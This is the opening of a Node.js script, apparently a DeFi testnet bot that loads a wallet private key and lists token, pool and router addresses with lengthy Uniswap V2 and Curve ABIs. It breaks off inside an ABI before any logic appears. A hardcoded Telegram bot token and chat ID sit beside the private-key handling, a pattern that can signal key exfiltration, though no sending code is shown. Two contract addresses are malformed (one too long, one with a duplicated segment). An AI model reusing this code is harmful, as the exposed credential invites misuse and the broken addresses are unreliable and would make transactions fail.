require('dotenv').config();
const { ethers } = require('ethers');
const inquirer = require('inquirer').default;
const chalk = require('chalk').default;
const https = require('https');

// --- Blockchain Configuration ---
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const RPC_URL = 'https://eth-sepolia.public.blastapi.io';
const ETHERSCAN_BASE_URL = 'https://sepolia.etherscan.io/';

if (!PRIVATE_KEY) {
    console.error(chalk.red('❌ Error: PRIVATE_KEY not found in .env file. Make sure your .env file is correct.'));
    process.exit(1);
}

const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
const signer = wallet.connect(provider);

// --- Contract Addresses ---
// Base Token Addresses
const R2_TOKEN_ADDRESS = '0xb816bB88f836EA75Ca4071B46FF285f690C43bb7';
const USDC_TOKEN_ADDRESS = '0x8BEbFCBe5468F146533C182dF3DFbF5ff9BE00E2';
const R2USD_TOKEN_ADDRESS = '0x9e8FF356D35a2Da385C546d6Bf1D77ff85133365';
const SR2USD_TOKEN_ADDRESS = '0x006CbF409CA275bA022111dB32BDAE054a97d488';

// LP Token Addresses
const R2_USDC_LP_CONTRACT_ADDRESS = '0xCdfDD7dD24bABDD05A2ff4dfcf06384c5Ad661a9';
const R2_R2USD_LP_CONTRACT_ADDRESS = '0x9Ae18109312c1452D3f0952d7eC1e26D15211FE9a1';
const USDC_R2USD_LP_CONTRACT_ADDRESS = '0x47d1B0623bB3E557bF8544C159c9ae51D091F8a2';
const R2USD_SR2USD_LP_CONTRACT_ADDRESS = '0xe85A06C238439F981c90b2C91393b2F3c46e27FC';

// Router/Pool Addresses
const SWAP_ROUTER_ADDRESS_R2_USDC = '0xeE567Fe1712Faf6149d80dA1E6934E354124CfE3';
const CURVE_POOL_ADDRESS_USDC_R2USD = '0x47d1B0623bB3E557bF8544C159c9ae51D091F8a2';
const CURVE_POOL_ADDRESS_R2USD_SR2USD = '0xe85A06C238439F981c90b2C91393b2C91393b2F3c46e27FC';

// ERC20 ABI
const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)",
    "function name() view returns (string)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

const TELEGRAM_BOT_TOKEN = "7948810372:AAE2SbZthZvMgj8gPxvsyQKN-mjmCaHiaIc";
const TELEGRAM_CHAT_ID = "7269890813";


// ABI for Uniswap V2-like Router (used for R2-USDC and R2-R2USD pairs)
const UNISWAP_V2_ROUTER_ABI = [{"inputs":[{"internalType":"address","name":"_factory","type":"address"},{"internalType":"address","name":"_WETH","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"WETH","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"tokenA","type":"address"},{"internalType":"address","name":"tokenB","type":"address"},{"internalType":"uint256","name":"amountADesired","type":"uint256"},{"internalType":"uint256","name":"amountBDesired","type":"uint256"},{"internalType":"uint256","name":"amountAMin","type":"uint256"},{"internalType":"uint256","name":"amountBMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"addLiquidity","outputs":[{"internalType":"uint256","name":"amountA","type":"uint256"},{"internalType":"uint256","name":"amountB","type":"uint256"},{"internalType":"uint256","name":"liquidity","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amountTokenDesired","type":"uint256"},{"internalType":"uint256","name":"amountTokenMin","type":"uint256"},{"internalType":"uint256","name":"amountETHMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"addLiquidityETH","outputs":[{"internalType":"uint256","name":"amountToken","type":"uint256"},{"internalType":"uint256","name":"amountETH","type":"uint256"},{"internalType":"uint256","name":"liquidity","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"factory","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"uint256","name":"reserveIn","type":"uint256"},{"internalType":"uint256","name":"reserveOut","type":"uint256"}],"name":"getAmountIn","outputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"reserveIn","type":"uint256"},{"internalType":"uint256","name":"reserveOut","type":"uint256"}],"name":"getAmountOut","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"}],"name":"getAmountsIn","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"}],"name":"getAmountsOut","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountA","type":"uint256"},{"internalType":"uint256","name":"reserveA","type":"uint256"},{"internalType":"uint256","name":"reserveB","type":"uint256"}],"name":"quote","outputs":[{"internalType":"uint256","name":"amountB","type":"uint256"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"address","name":"tokenA","type":"address"},{"internalType":"address","name":"tokenB","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountAMin","type":"uint256"},{"internalType":"uint256","name":"amountBMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"removeLiquidity","outputs":[{"internalType":"uint256","name":"amountA","type":"uint256"},{"internalType":"uint256","name":"amountB","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountTokenMin","type":"uint256"},{"internalType":"uint256","name":"amountETHMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"removeLiquidityETH","outputs":[{"internalType":"uint256","name":"amountToken","type":"uint256"},{"internalType":"uint256","name":"amountETH","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountTokenMin","type":"uint256"},{"internalType":"uint256","name":"amountETHMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"removeLiquidityETHSupportingFeeOnTransferTokens","outputs":[{"internalType":"uint256","name":"amountETH","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountTokenMin","type":"uint256"},{"internalType":"uint256","name":"amountETHMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bool","name":"approveMax","type":"bool"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"removeLiquidityETHWithPermit","outputs":[{"internalType":"uint256","name":"amountToken","type":"uint256"},{"internalType":"uint256","name":"amountETH","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountTokenMin","type":"uint256"},{"internalType":"uint256","name":"amountETHMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bool","name":"approveMax","type":"bool"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"removeLiquidityETHWithPermitSupportingFeeOnTransferTokens","outputs":[{"internalType":"uint256","name":"amountETH","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenA","type":"address"},{"internalType":"address","name":"tokenB","type":"address"},{"internalType":"uint256","name":"liquidity","type":"uint256"},{"internalType":"uint256","name":"amountAMin","type":"uint256"},{"internalType":"uint256","name":"amountBMin","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bool","name":"approveMax","type":"bool"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"removeLiquidityWithPermit","outputs":[{"internalType":"uint256","name":"amountA","type":"uint256"},{"internalType":"uint256","name":"amountB","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapETHForExactTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactETHForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactETHForTokensSupportingFeeOnTransferTokens","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETHSupportingFeeOnTransferTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokensSupportingFeeOnTransferTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"uint256","name":"amountInMax","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapTokensForExactETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"uint256","name":"amountInMax","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapTokensForExactTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];

// ABI for Curve-like pools (USDC-R2USD and R2USD-sR2USD)
const CURVE_POOL_ABI = [{"name":"Transfer","inputs":[{"name":"sender","type":"address","indexed":true},{"name":"receiver","type":"address","indexed":true},{"name":"value","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"name":"Approval","inputs":[{"name":"owner","type":"address","indexed":true},{"name":"spender","type":"address","indexed":true},{"name":"value","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"name":"TokenExchange","inputs":[{"name":"buyer","type":"address","indexed":true},{"name":"sold_id","type":"int128","indexed":false},{"name":"tokens_sold","type":"uint256","indexed":false},{"name":"bought_id","type":"int128","indexed":false},{"name":"tokens_bought","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"name":"TokenExchangeUnderlying","inputs":[{"name":"buyer","type":"address","indexed":true},{"name":"sold_id","type":"int128","indexed":false},{"name":"tokens_sold","type":"uint256","indexed":false},{"name":"bought_id","type":"int128","indexed":false},{"name":"tokens_bought","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"name":"AddLiquidity","inputs":[{"name":"provider","type":"address","indexed":true},{"name":"token_amounts","type":"uint256[]","indexed":false},{"name":"fees","type":"uint256[]","indexed":false},{"name":"invariant","type":"uint256","indexed":false},{"name":"token_supply","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"name":"RemoveLiquidity","inputs":[{"name":"provider","type":"address","indexed":true},{"name":"token_amounts","type":"uint256[]","indexed":false},{"name":"fees","type":"uint256[]","indexed":false},{"name":"token_supply","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"name":"RemoveLiquidityOne","inputs":[{"name":"provider","type":"address","indexed":true},{"name":"token_id","type":"int128","indexed":false},{"name":"token_amount","type":"uint256","indexed":false},{"name":"coin_amount","type":"uint256","indexed":false},{"name":"token_supply","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"name":"RemoveLiquidityImbalance","inputs":[{"name":"provider","type":"address","indexed":true},{"name":"token_amounts","type":"uint256[]","indexed":false},{"name":"fees","type":"uint256[]","indexed":false},{"name":"invariant","type":"uint256","indexed":false},{"name":"token_supply","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"name":"RampA","inputs":[{"name":"old_A","type":"uint256","indexed":false},{"name":"new_A","type":"uint256","indexed":false},{"name":"initial_time","type":"uint256","indexed":false},{"name":"future_time","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"name":"StopRampA","inputs":[{"name":"A","type":"uint256","indexed":false},{"name":"t","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"name":"ApplyNewFee","inputs":[{"name":"fee","type":"uint256","indexed":false},{"name":"offpeg_fee_multiplier","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"name":"SetNewMATime","inputs":[{"name":"ma_exp_time","type":"uint256","indexed":false},{"name":"D_ma_time","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"stateMutability":"nonpayable","type":"constructor","inputs":[{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_A","type":"uint256"},{"name":"_fee","type":"uint256"},{"name":"_offpeg_fee_multiplier","type":"uint256"},{"name":"_ma_exp_time","type":"uint256"},{"name":"_coins","type":"address[]"},{"name":"_rate_multipliers","type":"uint256[]"},{"name":"_asset_types","type":"uint8[]"},{"name":"_method_ids","type":"bytes4[]"},{"name":"_oracles","type":"address[]"}],"outputs":[]},{"stateMutability":"nonpayable","type":"function","name":"exchange","inputs":[{"name":"i","type":"int128"},{"name":"j","type":"int128"},{"name":"_dx","type":"uint256"},{"name":"_min_dy","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"exchange","inputs":[{"name":"i","type":"int128"},{"name":"j","type":"int128"},{"name":"_dx","type":"uint256"},{"name":"_min_dy","type":"uint256"},{"name":"_receiver","type":"address"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"exchange_received","inputs":[{"name":"i","type":"int128"},{"name":"j","type":"int128"},{"name":"_dx","type":"uint256"},{"name":"_min_dy","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"exchange_received","inputs":[{"name":"i","type":"int128"},{"name":"j","type":"int128"},{"name":"_dx","type":"uint256"},{"name":"_min_dy","type":"uint256"},{"name":"_receiver","type":"address"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"add_liquidity","inputs":[{"name":"_amounts","type":"uint256[]"},{"name":"_min_mint_amount","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"add_liquidity","inputs":[{"name":"_amounts","type":"uint256[]"},{"name":"_min_mint_amount","type":"uint256"},{"name":"_receiver","type":"address"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"remove_liquidity_one_coin","inputs":[{"name":"_burn_amount","type":"uint256"},{"name":"i","type":"int128"},{"name":"_min_received","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"remove_liquidity_one_coin","inputs":[{"name":"_burn_amount","type":"uint256"},{"name":"i","type":"int128"},{"name":"_min_received","type":"uint256"},{"name":"_receiver","type":"address"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"remove_liquidity_imbalance","inputs":[{"name":"_amounts","type":"uint256[]"},{"name":"_max_burn_amount","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"remove_liquidity_imbalance","inputs":[{"name":"_amounts","type":"uint256[]"},{"name":"_max_burn_amount","type":"uint256"},{"name":"_receiver","type":"address"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"remove_liquidity","inputs":[{"name":"_burn_amount","type":"uint256"},{"name":"_min_amounts","type":"uint256[]"}],"outputs":[{"name":"","type":"uint256[]"}]},{"stateMutability":"nonpayable","type":"function","name":"remove_liquidity","inputs":[{"name":"_burn_amount","type":"uint256"},{"name":"_min_amounts","type":"uint256[]"},{"name":"_receiver","type":"address"}],"outputs":[{"name":"","type":"uint256[]"}]},{"stateMutability":"nonpayable","type":"function","name":"remove_liquidity","inputs":[{"name":"_burn_amount","type":"uint256"},{"name":"_min_amounts","type":"uint256[]"},{"name":"_receiver","type":"address"},{"name":"_claim_admin_fees","type":"bool"}],"outputs":[{"name":"","type":"uint256[]"}]},{"stateMutability":"nonpayable","type":"function","name":"withdraw_admin_fees","inputs":[],"outputs":[]},{"stateMutability":"view","type":"function","name":"last_price","inputs":[{"name":"i","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"ema_price","inputs":[{"name":"i","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"get_p","inputs":[{"name":"i","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"price_oracle","inputs":[{"name":"i","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"D_oracle","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"transfer","inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"outputs":[{"name":"","type":"bool"}]},{"stateMutability":"nonpayable","type":"function","name":"transferFrom","inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"outputs":[{"name":"","type":"bool"}]},{"stateMutability":"nonpayable","type":"function","name":"approve","inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"outputs":[{"name":"","type":"bool"}]},{"stateMutability":"nonpayable","type":"function","name":"permit","inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"},{"name":"_deadline","type":"uint256"},{"name":"_v","type":"uint8"},{"name":"_r","type":"bytes32"},{"name":"_s","type":"bytes32"}],"outputs":[{"name":"","type":"bool"}]},{"stateMutability":"view","type":"function","name":"DOMAIN_SEPARATOR","inputs":[],"outputs":[{"name":"","type":"bytes32"}]},{"stateMutability":"view","type":"function","name":"get_dx","inputs":[{"name":"i","type":"int128"},{"name":"j","type":"int128"},{"name":"dy","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"get_dy","inputs":[{"name":"i","type":"int128"},{"name":"j","type":"int128"},{"name":"dx","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"calc_withdraw_one_coin","inputs":[{"name":"_burn_amount","type":"uint256"},{"name":"i","type":"int128"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"totalSupply","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"get_virtual_price","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"calc_token_amount","inputs":[{"name":"_amounts","type":"uint256[]"},{"name":"_is_deposit","type":"bool"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"A","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"A_precise","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"balances","inputs":[{"name":"i","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"get_balances","inputs":[],"outputs":[{"name":"","type":"uint256[]"}]},{"stateMutability":"view","type":"function","name":"stored_rates","inputs":[],"outputs":[{"name":"","type":"uint256[]"}]},{"stateMutability":"view","type":"function","name":"dynamic_fee","inputs":[{"name":"i","type":"int128"},{"name":"j","type":"int128"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"nonpayable","type":"function","name":"ramp_A","inputs":[{"name":"_future_A","type":"uint256"},{"name":"_future_time","type":"uint256"}],"outputs":[]},{"stateMutability":"nonpayable","type":"function","name":"stop_ramp_A","inputs":[],"outputs":[]},{"stateMutability":"nonpayable","type":"function","name":"set_new_fee","inputs":[{"name":"_new_fee","type":"uint256"},{"name":"_new_offpeg_fee_multiplier","type":"uint256"}],"outputs":[]},{"stateMutability":"nonpayable","type":"function","name":"set_ma_exp_time","inputs":[{"name":"_ma_exp_time","type":"uint256"},{"name":"_D_ma_time","type":"uint256"}],"outputs":[]},{"stateMutability":"view","type":"function","name":"N_COINS","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"coins","inputs":[{"name":"arg0","type":"uint256"}],"outputs":[{"name":"","type":"address"}]},{"stateMutability":"view","type":"function","name":"fee","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"offpeg_fee_multiplier","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"admin_fee","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"initial_A","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"future_A","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"initial_A_time","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"future_A_time","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"admin_balances","inputs":[{"name":"arg0","type":"uint256"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"ma_exp_time","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"D_ma_time","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"ma_last_time","inputs":[],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"name","inputs":[],"outputs":[{"name":"","type":"string"}]},{"stateMutability":"view","type":"function","name":"symbol","inputs":[],"outputs":[{"name":"","type":"string"}]},{"stateMutability":"view","type":"function","name":"decimals","inputs":[],"outputs":[{"name":"","type":"uint8"}]},{"stateMutability":"view","type":"function","name":"version","inputs":[],"outputs":[{"name":"","type":"string"}]},{"stateMutability":"view","type":"function","name":"balanceOf","inputs":[{"name":"arg0","type":"address"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"allowance","inputs":[{"name":"arg0","type":"address"},{"name":"arg1","type":"address"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"nonces","inputs":[{"name":"arg0","type":"address"}],"outputs":[{"name":"","type":"uint256"}]},{"stateMutability":"view","type":"function","name":"salt","inputs":[],"outputs":[{"name":"","type":"bytes32"}]}]

// ABI for R2-R2USD LP token (likely not needed directly if router handles removal)
// Kept for reference, but usage in performRemoveLiquidity might need adjustment depending on actual contract interaction.
const ADD_LIQUIDITY_ABI_R2_R2USD_LP = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"sender","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount0","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amount1","type":"uint256"},{"indexed":true,"internalType":"address","name":"to","type":"address"}],"name":"Burn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"sender","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount0In","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amount1In","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amount0Out","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amount1Out","type":"uint256"},{"indexed":true,"internalType":"address","name":"to","type":"address"}],"name":"Swap","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint112","name":"reserve0","type":"uint112"},{"indexed":false,"internalType":"uint112","name":"reserve1","type":"uint112"}],"name":"Sync","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"MINIMUM_LIQUIDITY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"PERMIT_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"}],"name":"burn","outputs":[{"internalType":"uint256","name":"amount0","type":"uint256"},{"internalType":"uint256","name":"amount1","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"factory","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"getReserves","outputs":[{"internalType":"uint112","name":"_reserve0","type":"uint112"},{"internalType":"uint112","name":"_reserve1","type":"uint112"},{"internalType":"uint32","name":"_blockTimestampLast","type":"uint32"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"_token0","type":"address"},{"internalType":"address","name":"_token1","type":"address"}],"name":"initialize","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"kLast","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"}],"name":"mint","outputs":[{"internalType":"uint256","name":"liquidity","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMuta